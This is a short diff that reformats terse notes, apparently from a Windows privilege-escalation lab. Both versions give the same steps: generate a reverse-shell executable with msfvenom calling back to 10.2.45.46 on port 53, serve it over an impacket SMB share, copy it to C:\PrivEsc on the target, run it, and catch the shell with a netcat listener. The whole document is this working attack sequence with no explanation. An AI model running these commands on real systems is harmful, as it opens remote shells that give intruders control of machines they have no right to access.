@@ -1,11 +1,10 @@
-Kali
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.45.46 LPORT=53 -f exe -o reverse.exe
-
-sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
-windows
-copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
-kali
-sudo nc -nvlp 53
+### Kali
+      msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.45.46 LPORT=53 -f exe -o reverse.exe
+      sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+### windows
+      copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
+### kali
+      sudo nc -nvlp 53
 windows test with 
 C:\PrivEsc\reverse.exe
 
